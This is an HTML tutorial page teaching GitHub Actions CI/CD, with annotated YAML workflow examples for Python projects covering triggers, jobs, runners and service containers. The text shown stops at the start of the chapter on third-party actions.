<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>GitHub Actions — Beginner to Advanced</title>
<meta name="description" content="Master GitHub Actions CI/CD from zero to production with in-depth theory and hands-on Python DevOps examples.">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
--bg:#ffffff;--bg2:#f8fafc;--bg3:#f1f5f9;--bg4:#e2e8f0;
--text:#0f172a;--text2:#334155;--text3:#64748b;--text4:#94a3b8;
--border:#e2e8f0;--border2:#cbd5e1;
--accent:#6366f1;--accent2:#818cf8;--accent-bg:#eef2ff;--accent-text:#3730a3;
--blue:#3b82f6;--blue-bg:#eff6ff;--blue-text:#1e40af;--blue-border:#bfdbfe;
--green:#10b981;--green-bg:#f0fdf4;--green-text:#166534;--green-border:#bbf7d0;
--amber:#f59e0b;--amber-bg:#fffbeb;--amber-text:#92400e;--amber-border:#fde68a;
--red:#ef4444;--red-bg:#fef2f2;--red-text:#991b1b;--red-border:#fecaca;
--purple:#8b5cf6;--purple-bg:#f5f3ff;--purple-text:#5b21b6;
--orange:#f97316;--orange-bg:#fff7ed;--orange-text:#9a3412;
--code-bg:#fafbff;--code-border:#d4d9f0;
--kw:#7c3aed;--str:#059669;--cm:#94a3b8;--fn:#2563eb;--num:#d97706;--bool:#e11d48;--key:#0369a1;--val:#b45309;--tag:#6d28d9;--attr:#0f766e;--op:#64748b;
--font-sans:'Inter',system-ui,-apple-system,sans-serif;
--font-mono:'JetBrains Mono','Fira Code',monospace;
--radius:8px;--radius-lg:12px;--shadow:0 1px 3px rgba(0,0,0,0.06),0 1px 2px rgba(0,0,0,0.04);
}
@media(prefers-color-scheme:dark){:root{
--bg:#0f172a;--bg2:#1e293b;--bg3:#334155;--bg4:#475569;
--text:#f1f5f9;--text2:#cbd5e1;--text3:#94a3b8;--text4:#64748b;
--border:#334155;--border2:#475569;
--accent:#818cf8;--accent2:#a5b4fc;--accent-bg:#1e1b4b;--accent-text:#c7d2fe;
--blue:#60a5fa;--blue-bg:#172554;--blue-text:#93c5fd;--blue-border:#1e3a5f;
--green:#34d399;--green-bg:#052e16;--green-text:#86efac;--green-border:#14532d;
--amber:#fbbf24;--amber-bg:#451a03;--amber-text:#fcd34d;--amber-border:#78350f;
--red:#f87171;--red-bg:#450a0a;--red-text:#fca5a5;--red-border:#7f1d1d;
--purple:#a78bfa;--purple-bg:#2e1065;--purple-text:#c4b5fd;
--code-bg:#1a1f36;--code-border:#2d3555;
--kw:#c4b5fd;--str:#6ee7b7;--cm:#64748b;--fn:#93c5fd;--num:#fcd34d;--bool:#fda4af;--key:#7dd3fc;--val:#fcd34d;--tag:#c4b5fd;--attr:#5eead4;--op:#94a3b8;
--shadow:0 1px 3px rgba(0,0,0,0.3);
}}
body{font-family:var(--font-sans);background:var(--bg);color:var(--text);line-height:1.7;font-size:16px;-webkit-font-smoothing:antialiased}
a{color:var(--accent);text-decoration:none;transition:color .15s}
a:hover{text-decoration:underline;color:var(--accent2)}
code{font-family:var(--font-mono);font-size:0.85em;background:var(--accent-bg);color:var(--accent-text);padding:2px 7px;border-radius:4px}
strong{font-weight:600;color:var(--text)}
.wrapper{display:flex;max-width:1260px;margin:0 auto;gap:36px;padding:0 24px}
.sidebar{width:260px;flex-shrink:0;padding-top:32px;position:sticky;top:16px;max-height:calc(100vh - 32px);overflow-y:auto;scrollbar-width:thin}
.sidebar::-webkit-scrollbar{width:3px}.sidebar::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
.main{flex:1;min-width:0;padding:32px 0 80px}
.progress-wrap{margin-bottom:20px}
.progress-label{font-size:12px;color:var(--text3);margin-bottom:6px;font-weight:500}
.progress-bar{height:5px;border-radius:3px;background:var(--bg3);overflow:hidden}
.progress-fill{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--accent),var(--blue));transition:width 0.5s ease}
.nav-btn{display:flex;align-items:center;gap:8px;width:100%;padding:7px 12px;margin-bottom:1px;border:none;border-radius:var(--radius);cursor:pointer;font-size:13px;font-family:var(--font-sans);text-align:left;background:transparent;color:var(--text3);transition:all 0.15s}
.nav-btn:hover{background:var(--bg2);color:var(--text2)}
.nav-btn.active{background:var(--accent-bg);color:var(--accent-text);font-weight:600}
.nav-btn .icon{width:22px;text-align:center;font-size:13px;flex-shrink:0}
.nav-btn .check{color:var(--green);font-weight:700}

/* Hero */
.hero{background:linear-gradient(135deg,#1e1b4b 0%,#312e81 40%,#3730a3 100%);border-radius:20px;padding:52px 40px;margin-bottom:44px;position:relative;overflow:hidden}
.hero::before{content:'';position:absolute;top:-50%;right:-20%;width:500px;height:500px;background:radial-gradient(circle,rgba(129,140,248,0.15) 0%,transparent 70%);pointer-events:none}
.hero::after{content:'';position:absolute;bottom:-30%;left:-10%;width:400px;height:400px;background:radial-gradient(circle,rgba(99,102,241,0.1) 0%,transparent 70%);pointer-events:none}
.hero *{position:relative}
.hero h1{font-size:36px;font-weight:700;color:#fff;margin:0 0 14px;line-height:1.15;letter-spacing:-0.5px}
.hero p{color:#c7d2fe;font-size:17px;line-height:1.7;max-width:620px}
.hero-badges{display:flex;gap:8px;margin-bottom:18px;flex-wrap:wrap}
.hero-badge{padding:4px 12px;border-radius:20px;font-size:11px;font-weight:600;letter-spacing:0.4px;border:1px solid rgba(255,255,255,0.15)}
.hb-1{background:rgba(99,102,241,0.3);color:#e0e7ff}.hb-2{background:rgba(16,185,129,0.2);color:#a7f3d0}.hb-3{background:rgba(244,114,182,0.2);color:#fbcfe8}
.hero-stats{display:flex;gap:28px;margin-top:28px;flex-wrap:wrap}
.hero-stats span{display:flex;align-items:center;gap:7px;color:#e0e7ff;font-size:14px;font-weight:500}

/* Sections */
section{margin-bottom:56px;scroll-margin-top:80px}
.sec-header{margin-bottom:4px}
.sec-number{font-size:12px;font-weight:700;color:var(--accent);text-transform:uppercase;letter-spacing:1.2px;margin-bottom:6px}
h2{font-size:28px;font-weight:700;color:var(--text);margin:0 0 6px;line-height:1.25;letter-spacing:-0.3px}
h2 .sec-icon{margin-right:10px}
h3{font-size:19px;font-weight:600;color:var(--text);margin:32px 0 12px;padding-bottom:8px;border-bottom:1px solid var(--border)}
h4{font-size:16px;font-weight:600;color:var(--text);margin:24px 0 8px}
.lead{font-size:17px;color:var(--text2);line-height:1.8;margin:6px 0 20px}
p.desc{color:var(--text2);font-size:15px;line-height:1.85;margin:12px 0}

/* Theory blocks */
.theory{background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-lg);padding:24px 28px;margin:20px 0}
.theory h4{margin:0 0 10px;font-size:16px;color:var(--accent-text);display:flex;align-items:center;gap:8px}
.theory h4::before{content:'📖';font-size:16px}
.theory p{color:var(--text2);font-size:14px;line-height:1.85;margin:8px 0}
.theory ul{margin:8px 0;padding-left:20px}
.theory li{color:var(--text2);font-size:14px;line-height:1.85;margin:4px 0}
.theory li strong{color:var(--text)}

/* Code blocks — light themed with syntax highlighting */
.code-block{background:var(--code-bg);border:1px solid var(--code-border);border-radius:var(--radius-lg);overflow:hidden;margin:18px 0;box-shadow:var(--shadow)}
.code-header{background:var(--bg2);padding:10px 16px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--code-border)}
.code-title{color:var(--text2);font-size:13px;font-weight:600;display:flex;align-items:center;gap:6px}
.code-title::before{content:'';width:8px;height:8px;border-radius:50%;flex-shrink:0}
.code-yaml .code-title::before{background:#7c3aed}
.code-python .code-title::before{background:#2563eb}
.code-bash .code-title::before{background:#059669}
.code-docker .code-title::before{background:#0ea5e9}
.code-text .code-title::before{background:#64748b}
.code-lang{font-size:11px;font-weight:500;padding:2px 8px;border-radius:4px;background:var(--bg3);color:var(--text3)}
.copy-btn{background:var(--bg);border:1px solid var(--border);color:var(--text3);padding:4px 12px;border-radius:6px;cursor:pointer;font-size:11px;font-weight:500;font-family:var(--font-sans);transition:all .15s;margin-left:8px}
.copy-btn:hover{background:var(--accent-bg);color:var(--accent-text);border-color:var(--accent)}
.code-block pre{margin:0;padding:18px 20px;overflow-x:auto;font-size:13px;line-height:1.75;color:var(--text2);font-family:var(--font-mono);tab-size:2}
.kw{color:var(--kw);font-weight:500}
.str{color:var(--str)}
.cm{color:var(--cm);font-style:italic}
.fn{color:var(--fn)}
.num{color:var(--num)}
.bl{color:var(--bool)}
.ky{color:var(--key);font-weight:500}
.vl{color:var(--val)}
.tg{color:var(--tag)}
.at{color:var(--attr)}
.op{color:var(--op)}
.pn{color:var(--text3)}

/* Callouts */
.callout{border-radius:var(--radius-lg);padding:16px 20px;margin:20px 0;border-left:4px solid;display:flex;gap:14px}
.callout-icon{font-size:20px;flex-shrink:0;margin-top:1px}
.callout-content{flex:1}
.callout-title{font-weight:600;margin-bottom:4px;font-size:14px}
.callout-body{font-size:13.5px;line-height:1.8}
.callout-info{background:var(--blue-bg);border-color:var(--blue);color:var(--blue-text)}
.callout-warning{background:var(--amber-bg);border-color:var(--amber);color:var(--amber-text)}
.callout-success{background:var(--green-bg);border-color:var(--green);color:var(--green-text)}
.callout-danger{background:var(--red-bg);border-color:var(--red);color:var(--red-text)}

/* Diagrams */
.diagram-box{background:var(--bg2);border-radius:var(--radius-lg);padding:28px;margin:20px 0;border:1px solid var(--border);overflow-x:auto}
.diagram-box pre{margin:0;font-size:12.5px;line-height:1.7;font-family:var(--font-mono);color:var(--text2);white-space:pre}

/* Feature grids */
.feature-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:14px;margin:18px 0}
.feature-card{background:var(--bg);border:1px solid var(--border);border-radius:var(--radius-lg);padding:18px 20px;transition:border-color .15s,box-shadow .15s}
.feature-card:hover{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent)}
.feature-card .fi{font-size:22px;margin-bottom:8px}
.feature-card .ft{font-weight:600;font-size:14px;color:var(--text);margin-bottom:4px}
.feature-card .fd{font-size:13px;color:var(--text3);line-height:1.65}

/* Steps */
.steps{margin:18px 0}
.step{display:flex;gap:14px}
.step-line{display:flex;flex-direction:column;align-items:center}
.step-num{width:30px;height:30px;border-radius:50%;background:var(--accent-bg);color:var(--accent-text);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;flex-shrink:0}
.step-connector{width:2px;flex:1;background:var(--border);min-height:16px}
.step-content{padding-bottom:18px}
.step-title{font-weight:600;font-size:14px;color:var(--text)}
.step-desc{font-size:13px;color:var(--text3);line-height:1.65;margin-top:3px}

/* Key concept cards */
.concept-row{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:14px;margin:18px 0}
.concept-card{border:1px solid var(--border);border-radius:var(--radius-lg);padding:18px 20px;background:var(--bg);position:relative;overflow:hidden}
.concept-card::before{content:'';position:absolute;top:0;left:0;width:4px;height:100%;background:var(--accent)}
.concept-card .cc-title{font-weight:600;font-size:15px;color:var(--text);margin-bottom:6px}
.concept-card .cc-desc{font-size:13px;color:var(--text3);line-height:1.7}

/* Compare table */
.compare-table{width:100%;border-collapse:collapse;margin:18px 0;font-size:14px;border:1px solid var(--border);border-radius:var(--radius-lg);overflow:hidden}
.compare-table th{background:var(--bg2);color:var(--text);font-weight:600;padding:12px 16px;text-align:left;border-bottom:1px solid var(--border);font-size:13px}
.compare-table td{padding:10px 16px;border-bottom:1px solid var(--border);color:var(--text2);font-size:13px;line-height:1.6}
.compare-table tr:last-child td{border-bottom:none}
.compare-table tr:hover td{background:var(--bg2)}

/* Mobile */
.mobile-bar{display:none;position:sticky;top:0;z-index:100;padding:10px 16px;background:var(--bg);border-bottom:1px solid var(--border);backdrop-filter:blur(12px);align-items:center;gap:10px}
.mobile-bar button{border:none;background:none;font-size:20px;cursor:pointer;color:var(--text);padding:4px}
.mobile-bar span{font-size:14px;font-weight:600;color:var(--text)}
.mobile-overlay{display:none;position:fixed;inset:0;z-index:200;background:rgba(0,0,0,0.45)}
.mobile-overlay.open{display:block}
.mobile-drawer{width:300px;height:100%;background:var(--bg);padding:24px;overflow-y:auto}

.footer{border-top:1px solid var(--border);margin-top:56px;padding-top:28px;text-align:center}
.footer p{color:var(--text3);font-size:13px}
.footer .sub{color:var(--text4);font-size:12px;margin-top:6px}

.sep{width:60px;height:3px;border-radius:2px;background:linear-gradient(90deg,var(--accent),var(--blue));margin:8px 0 20px}

@media(max-width:860px){
.sidebar{display:none}.mobile-bar{display:flex!important}
.main{padding:20px 0 60px}.hero{padding:32px 24px;border-radius:14px}.hero h1{font-size:26px}
.wrapper{padding:0 16px}
}
</style>
</head>
<body>

<div class="mobile-bar" id="mobileBar">
<button onclick="toggleMobile()" aria-label="Menu">☰</button>
<span>GitHub Actions Masterclass</span>
</div>
<div class="mobile-overlay" id="mobileOverlay" onclick="toggleMobile()">
<div class="mobile-drawer" onclick="event.stopPropagation()" id="mobileDrawer"></div>
</div>

<div class="wrapper">
<aside class="sidebar" id="sidebar"></aside>
<main class="main" id="mainContent"></main>
</div>

<script>
const S=[
{id:"intro",n:"01",title:"Introduction",icon:"🚀"},
{id:"setup",n:"02",title:"Tools & initial setup",icon:"🔧"},
{id:"blocks",n:"03",title:"Building blocks",icon:"🧱"},
{id:"triggers",n:"04",title:"Event triggers",icon:"⚡"},
{id:"runners",n:"05",title:"Workflow runners",icon:"💻"},
{id:"actions",n:"06",title:"Third-party actions",icon:"📦"},
{id:"filters",n:"07",title:"Event filters & activity types",icon:"🔍"},
{id:"contexts",n:"08",title:"Contexts, expressions & variables",icon:"📐"},
{id:"functions",n:"09",title:"Functions",icon:"🧮"},
{id:"flow",n:"10",title:"Controlling execution flow",icon:"🔀"},
{id:"io",n:"11",title:"Inputs & outputs",icon:"↔️"},
{id:"caching",n:"12",title:"Caching & artifacts",icon:"💾"},
{id:"matrix",n:"13",title:"Working with matrices",icon:"📊"},
{id:"envs",n:"14",title:"Environments",icon:"🌍"},
{id:"custom",n:"15",title:"Custom actions",icon:"⚙️"},
{id:"reusable",n:"16",title:"Reusable workflows",icon:"♻️"},
{id:"concurrency",n:"17",title:"Managing concurrency",icon:"🔒"},
{id:"security",n:"18",title:"Workflow security",icon:"🛡️"},
{id:"conclusion",n:"19",title:"Conclusion",icon:"🎓"}
];
let activeId="intro";const visited=new Set(["intro"]);

function buildNav(c){
c.innerHTML=`<nav style="padding-top:4px">${S.map(s=>`<button class="nav-btn${s.id===activeId?' active':''}" data-id="${s.id}" onclick="go('${s.id}')"><span class="icon">${s.icon}</span><span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${s.title}</span></button>`).join('')}</nav>`;}

function updateNav(){
document.querySelectorAll('.nav-btn').forEach(b=>{
const id=b.dataset.id;b.classList.toggle('active',id===activeId);});}

function go(id){activeId=id;visited.add(id);updateNav();document.getElementById(id)?.scrollIntoView({behavior:'smooth'});toggleMobile(false);}
function toggleMobile(f){const o=document.getElementById('mobileOverlay');const open=f!==undefined?f:!o.classList.contains('open');o.classList.toggle('open',open);if(open)buildNav(document.getElementById('mobileDrawer'));}
function copyCode(btn){const pre=btn.closest('.code-block').querySelector('pre');navigator.clipboard.writeText(pre.textContent).then(()=>{btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',1500)});}

// Syntax highlighting helpers
function hl(raw,lang){
  let s=raw.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  if(lang==='yaml'){
    s=s.replace(/^(\s*)(#.*)$/gm,'$1<span class=cm>$2</span>');
    s=s.replace(/^(\s*)([\w][\w.\-\/]*)(\s*:\s*\|?\s*)$/gm,'$1<span class=ky>$2</span>$3');
    s=s.replace(/^(\s*)([\w][\w.\-\/]*)(\s*:)/gm,'$1<span class=ky>$2</span>$3');
    s=s.replace(/:\s*(&quot;[^"]*&quot;|"[^"]*")/g,': <span class=str>$1</span>');
    s=s.replace(/:\s*('[^']*')/g,': <span class=str>$1</span>');
    s=s.replace(/:\s*(true|false)\b/gi,': <span class=bl>$1</span>');
    s=s.replace(/:\s*(\d+\.?\d*)\s*$/gm,': <span class=num>$1</span>');
    s=s.replace(/(- )(uses:)/gm,'$1<span class=ky>$2</span>');
    s=s.replace(/(\$\{\{[^}]*\}\})/g,'<span class=fn>$1</span>');
  } else if(lang==='python'){
    s=s.replace(/(#.*)$/gm,'<span class=cm>$1</span>');
    s=s.replace(/\b(from|import|def|class|return|if|else|elif|with|as|for|in|while|try|except|finally|raise|yield|lambda|not|and|or|is|True|False|None)\b/g,'<span class=kw>$1</span>');
    s=s.replace(/("[^"]*"|'[^']*')/g,'<span class=str>$1</span>');
    s=s.replace(/\b(\d+)\b/g,'<span class=num>$1</span>');
    s=s.replace(/(def\s+)(\w+)/g,'$1<span class=fn>$2</span>');
  } else if(lang==='bash'||lang==='dockerfile'){
    s=s.replace(/(#.*)$/gm,'<span class=cm>$1</span>');
    s=s.replace(/\b(FROM|RUN|COPY|ENTRYPOINT|ENV|WORKDIR|EXPOSE|CMD|ARG)\b/g,'<span class=kw>$1</span>');
    s=s.replace(/("[^"]*")/g,'<span class=str>$1</span>');
    s=s.replace(/\b(echo|set|if|then|fi|else|exit|chmod|pip|python|curl|cd|mkdir|export|source)\b/g,'<span class=fn>$1</span>');
  }
  return s;
}

function code(title,lang,raw){
const cls=lang==='dockerfile'?'docker':lang;
return`<div class="code-block code-${cls}"><div class="code-header"><span class="code-title">${title}</span><div style="display:flex;align-items:center;gap:6px"><span class="code-lang">${lang.toUpperCase()}</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div></div><pre>${hl(raw,lang)}</pre></div>`;}

function callout(type,title,body){
const icons={info:'💡',warning:'⚠️',success:'✅',danger:'🚨'};
return`<div class="callout callout-${type}"><div class="callout-icon">${icons[type]}</div><div class="callout-content"><div class="callout-title">${title}</div><div class="callout-body">${body}</div></div></div>`;}

function theory(title,body){return`<div class="theory"><h4>${title}</h4>${body}</div>`;}
function diagram(c){return`<div class="diagram-box"><pre>${c}</pre></div>`;}
function grid(items){return`<div class="feature-grid">${items.map(i=>`<div class="feature-card"><div class="fi">${i[0]}</div><div class="ft">${i[1]}</div><div class="fd">${i[2]}</div></div>`).join('')}</div>`;}
function steps(s){return`<div class="steps">${s.map((x,i)=>`<div class="step"><div class="step-line"><div class="step-num">${i+1}</div>${i<s.length-1?'<div class="step-connector"></div>':''}</div><div class="step-content"><div class="step-title">${x[0]}</div><div class="step-desc">${x[1]}</div></div></div>`).join('')}</div>`;}
function concepts(items){return`<div class="concept-row">${items.map(i=>`<div class="concept-card"><div class="cc-title">${i[0]}</div><div class="cc-desc">${i[1]}</div></div>`).join('')}</div>`;}
function table(headers,rows){return`<table class="compare-table"><thead><tr>${headers.map(h=>`<th>${h}</th>`).join('')}</tr></thead><tbody>${rows.map(r=>`<tr>${r.map(c=>`<td>${c}</td>`).join('')}</tr>`).join('')}</tbody></table>`;}
function sec(id,n,icon,title,lead,body){return`<section id="${id}"><div class="sec-header"><div class="sec-number">Chapter ${n}</div><h2><span class="sec-icon">${icon}</span>${title}</h2><div class="sep"></div><p class="lead">${lead}</p></div>${body}</section>`;}

// ═══════════════════════════════════════════
// BUILD THE PAGE
// ═══════════════════════════════════════════
document.getElementById('mainContent').innerHTML=`

<!-- HERO -->

${sec("intro","01","🚀","Introduction",
"Understand what GitHub Actions is, why it matters in modern DevOps, and how it compares to other CI/CD tools.",`

${theory("What is CI/CD and why does it matter?",`
<p><strong>Continuous Integration (CI)</strong> is a development practice where developers frequently merge their code changes into a shared repository — typically several times a day. Each merge triggers an automated build and test process. The core idea is simple: if you integrate small changes often, bugs are caught early, and the codebase stays healthy.</p>
<p><strong>Continuous Delivery/Deployment (CD)</strong> extends CI by automatically preparing code for release to production (delivery) or actually deploying it (deployment). Together, CI/CD creates a pipeline that takes code from a developer's laptop to production with minimal manual intervention.</p>
<p>Without CI/CD, teams face "integration hell" — merging weeks of work from multiple developers and spending days fixing conflicts and bugs. With CI/CD, every commit is validated automatically, and deployments become routine rather than stressful events.</p>
`)}

${theory("What exactly is GitHub Actions?",`
<p>GitHub Actions is a <strong>workflow automation platform</strong> built directly into GitHub. Launched in 2019, it allows you to automate tasks in response to events in your repository. While it's most commonly used for CI/CD pipelines, it can automate virtually anything: labeling issues, sending notifications, generating documentation, or running scheduled maintenance scripts.</p>
<p>Think of it this way: GitHub Actions is an event-driven system. Something happens in your repo (a <em>trigger</em>), and GitHub automatically runs a series of commands (a <em>workflow</em>) on a virtual machine (a <em>runner</em>) that GitHub provides for free.</p>
<p>The key innovation is that it's <strong>native to where your code already lives</strong>. Unlike external CI/CD services (Jenkins, CircleCI, Travis CI) that require separate setup, configuration, and account management, GitHub Actions is a zero-configuration-to-start service that reads YAML files from your repository.</p>
`)}

<!-- ═══════ 3. BUILDING BLOCKS ═══════ -->
${sec("blocks","03","🧱","Building blocks",
"Understand the five fundamental components that make up every GitHub Actions workflow — and how they fit together.",`

${theory("The five building blocks",`
<p>Every GitHub Actions workflow, no matter how complex, is built from exactly five components. Understanding their relationships is the single most important concept in this entire guide:</p>
<ul>
<li><strong>Workflow</strong> — A YAML file in <code>.github/workflows/</code>. It's the top-level container. A repository can have unlimited workflows, each triggered by different events.</li>
<li><strong>Event</strong> — The trigger that starts a workflow. Could be a push, pull request, schedule, manual click, or even an API call from an external system.</li>
<li><strong>Job</strong> — A group of steps that runs on the same virtual machine. A workflow can have multiple jobs. <strong>Jobs run in parallel by default</strong> — this is crucial to understand. If Job A and Job B have no dependency, they start simultaneously on separate machines.</li>
<li><strong>Step</strong> — A single task inside a job. Steps always run <strong>sequentially</strong> within their job. Each step either runs a shell command (<code>run:</code>) or invokes a pre-built action (<code>uses:</code>).</li>
<li><strong>Runner</strong> — The virtual machine that executes a job. GitHub provides hosted runners (Ubuntu, Windows, macOS) for free, or you can connect your own self-hosted runners.</li>
</ul>
`)}

${callout("warning","Critical concept: job isolation","Each job gets a <strong>completely fresh virtual machine</strong>. Jobs share nothing — no files, no installed packages, no environment variables. If Job 1 installs Python packages and creates build files, Job 2 cannot access any of them. To share data between jobs, you must use <strong>artifacts</strong> (Chapter 12) or <strong>job outputs</strong> (Chapter 11).")}

<h3>Complete annotated workflow</h3>
<p class="desc">Here's a full workflow file with every line explained. Study this carefully — it's the template for everything that follows:</p>

${code(".github/workflows/ci.yml — fully annotated","yaml",`# ── LEVEL 1: Workflow metadata ──
name: Python CI Pipeline

# ── LEVEL 2: Event triggers — WHEN does this run? ──
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

# ── LEVEL 3: Env vars available to ALL jobs ──
env:
  PYTHON_VERSION: "3.11"
  APP_NAME: "my-python-app"

# ── LEVEL 4: Jobs — WHAT runs? ──
jobs:
  test:
    name: Run tests
    runs-on: ubuntu-latest

    steps:
      # Step using a pre-built action
      - name: Checkout code
        uses: actions/checkout@v4

      # Step using an action with configuration
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: \${{ env.PYTHON_VERSION }}

      # Step running shell commands
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt

      # Step running tests
      - name: Run pytest
        run: pytest test_app.py -v --tb=short`)}

${theory("Understanding parallel vs sequential execution",`
<p>This is where many beginners get confused, so let's be crystal clear:</p>
<ul>
<li><strong>Steps within a job</strong> → Always <strong>sequential</strong>. Step 2 waits for Step 1 to finish. They share the same filesystem.</li>
<li><strong>Jobs within a workflow</strong> → <strong>Parallel by default</strong>. Unless you specify <code>needs:</code>, all jobs start at the same time on separate machines.</li>
<li><strong>Workflows</strong> → <strong>Independent</strong>. If you have ci.yml and deploy.yml both triggered by push, they run as completely separate workflow instances.</li>
</ul>
<p>This parallel-by-default design is powerful — it means your lint, test, and security scan can all run simultaneously, cutting your total CI time dramatically.</p>
`)}
`)}

<!-- ═══════ 4. EVENT TRIGGERS ═══════ -->
${sec("triggers","04","⚡","Event triggers",
"Master the event system that decides when your workflows run — from simple pushes to complex scheduled and manual triggers.",`

${theory("How the event system works",`
<p>GitHub's event system is the heartbeat of Actions. Every action taken in your repository generates an <strong>event</strong> — pushing code, opening a PR, creating an issue, publishing a release, even starring the repo. GitHub Actions lets you "subscribe" to these events using the <code>on:</code> keyword.</p>
<p>Events carry a <strong>payload</strong> — a JSON object with details about what happened. For a push event, the payload includes the commits, the branch, the pusher's identity, and more. You can access this data in your workflow via the <code>github.event</code> context (covered in Chapter 8).</p>
<p>There are three broad categories of events:</p>
<ul>
<li><strong>Webhook events</strong> — Triggered by GitHub activity: push, pull_request, issues, release, etc. These are the most common.</li>
<li><strong>Scheduled events</strong> — Triggered by a cron schedule. Useful for nightly builds, weekly security scans, or periodic data processing.</li>
<li><strong>Manual events</strong> — Triggered by a human clicking a button (<code>workflow_dispatch</code>) or an API call (<code>repository_dispatch</code>).</li>
</ul>
`)}

<h3>All major trigger types with explanations</h3>
${code("Complete trigger reference","yaml",`on:
  # ── WEBHOOK EVENTS ──
  push:                          # Fires when commits are pushed
    branches: [main, develop]    # Only for these branches
  
  pull_request:                  # Fires on PR activity
    branches: [main]             # Only PRs targeting main

  # ── MANUAL TRIGGERS ──
  workflow_dispatch:             # Adds "Run workflow" button in UI
    inputs:
      environment:
        description: "Deploy target"
        required: true
        default: "staging"
        type: choice
        options:
          - staging
          - production
      debug:
        description: "Enable debug logging"
        type: boolean
        default: false

  # ── SCHEDULED TRIGGERS ──
  schedule:
    - cron: "30 5 * * 1-5"      # 5:30 AM UTC, Mon-Fri
    # Format: minute hour day-of-month month day-of-week
    # ┬ ┬ ┬ ┬ ┬
    # │ │ │ │ └── Day of week (0=Sun, 6=Sat)
    # │ │ │ └──── Month (1-12)
    # │ │ └────── Day of month (1-31)
    # │ └──────── Hour (0-23, UTC)
    # └────────── Minute (0-59)

  # ── OTHER USEFUL EVENTS ──
  issues:
    types: [opened, labeled]
  release:
    types: [published]
  workflow_call:                 # Makes this callable by other workflows
  repository_dispatch:          # External API webhook trigger`)}

${callout("info","Cron schedule tip","GitHub uses <strong>UTC time</strong> for all cron schedules. If you're in IST (UTC+5:30) and want a job to run at 9:00 AM IST, set the cron to <code>30 3 * * *</code> (3:30 AM UTC). Also note: scheduled workflows only run on the default branch (usually <code>main</code>).")}

<h3>Practical example: smart multi-trigger pipeline</h3>
<p class="desc">Here's a real-world workflow that uses multiple trigger types with different behavior for each:</p>

${code(".github/workflows/smart-ci.yml","yaml",`name: Smart CI Pipeline

on:
  push:
    branches: [main]
    paths:
      - "**.py"
      - "requirements.txt"
      - "Dockerfile"
  pull_request:
    branches: [main]
  schedule:
    - cron: "0 6 * * 1"         # Weekly Monday 6AM UTC
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: pip install -r requirements.txt
      - run: pytest test_app.py -v

  security-scan:
    # Only on schedule or main branch push — not on PRs
    if: github.event_name == 'schedule' || github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install safety bandit
      - run: safety check -r requirements.txt
      - run: bandit -r . -ll`)}
`)}

<!-- ═══════ 5. RUNNERS ═══════ -->
${sec("runners","05","💻","Workflow runners",
"Understand the machines that execute your code — GitHub-hosted runners, self-hosted options, containers, and service containers for databases.",`

${theory("What is a runner?",`
<p>A runner is a <strong>virtual machine</strong> (or physical machine) that executes the steps in your job. When a job starts, GitHub provisions a fresh VM, runs your steps, and then destroys it. Every job gets a brand-new machine — nothing persists between runs unless you use caching or artifacts.</p>
<p><strong>GitHub-hosted runners</strong> are free VMs managed by GitHub. They come pre-installed with common tools (Git, Docker, Python, Node.js, etc.) and are the easiest option. For most projects, these are all you need.</p>
<p><strong>Self-hosted runners</strong> are machines you manage yourself — physical servers, cloud VMs, or even Raspberry Pis. You'd use these when you need GPU access, specific hardware, internal network access, or to avoid minute limits.</p>
`)}

${grid([
["🐧","ubuntu-latest","Ubuntu 22.04 LTS. 2 CPU cores, 7GB RAM, 14GB SSD. Most popular choice."],
["🪟","windows-latest","Windows Server 2022. 2 cores, 7GB RAM. Use for .NET or Windows-specific testing."],
["🍎","macos-latest","macOS 14 Sonoma. 3 cores, 7GB RAM. Required for iOS/macOS builds. 10x cost!"],
["🔒","self-hosted","Your own machines. Full control over hardware, software, and network access."]
])}

${code("Runners, containers, and service containers","yaml",`jobs:
  # Standard hosted runner
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pytest test_app.py -v

  # Self-hosted with custom labels
  ml-training:
    runs-on: [self-hosted, linux, gpu]
    steps:
      - uses: actions/checkout@v4
      - run: python train.py --epochs 100

  # Run entire job inside a Docker container
  containerized:
    runs-on: ubuntu-latest
    container:
      image: python:3.11-slim
      env:
        APP_ENV: testing
    steps:
      - uses: actions/checkout@v4
      - run: python -c "import sys; print(sys.version)"

  # Service containers for integration testing
  integration-tests:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: testpass
          POSTGRES_DB: testdb
        ports: ["5432:5432"]
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      redis:
        image: redis:7
        ports: ["6379:6379"]
    steps:
      - uses: actions/checkout@v4
      - run: pip install -r requirements.txt
      - name: Run integration tests
        env:
          DATABASE_URL: postgresql://postgres:testpass@localhost:5432/testdb
          REDIS_URL: redis://localhost:6379
        run: pytest tests/integration/ -v`)}

`)}

<!-- ═══════ 6. THIRD-PARTY ACTIONS ═══════ -->
